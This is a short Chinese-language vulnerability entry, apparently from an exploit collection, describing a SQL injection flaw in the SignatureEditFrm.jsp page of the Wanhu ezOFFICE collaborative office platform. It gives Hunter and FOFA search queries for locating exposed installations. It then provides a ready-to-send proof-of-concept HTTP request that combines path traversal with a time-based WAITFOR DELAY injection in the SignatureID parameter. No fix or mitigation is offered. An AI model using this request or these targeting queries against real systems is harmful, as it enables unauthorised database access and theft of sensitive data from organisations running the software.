# 万户ezoffice协同办公平台SignatureEditFrm存在SQL注入漏洞
万户ezOFFICE协同管理平台是一个综合信息基础应用平台。 万户协同办公平台SignatureEditFrm.jsp存在SQL注入漏洞，<font style="color:rgb(62, 62, 62);">攻击者通过发送特殊的请求包可以对数据库进行SQL注入，获取服务器敏感信息。</font>

## hunter

```javascript
app.name="万户 Ezoffice OA"
```

## fofa 

```javascript
app="万户ezOFFICE协同管理平台"
```

![](https://cdn.nlark.com/yuque/0/2023/png/1622799/1694241158110-8d4eef16-79f1-46eb-899b-344bd2a7a19f.png)

## poc
```javascript
GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iWebRevision.jsp/Signature/SignatureEditFrm.jsp?SignatureID=1;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Connection: close
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1729701858827-06212d8a-1006-466d-ad6c-dae829018f0a.png)

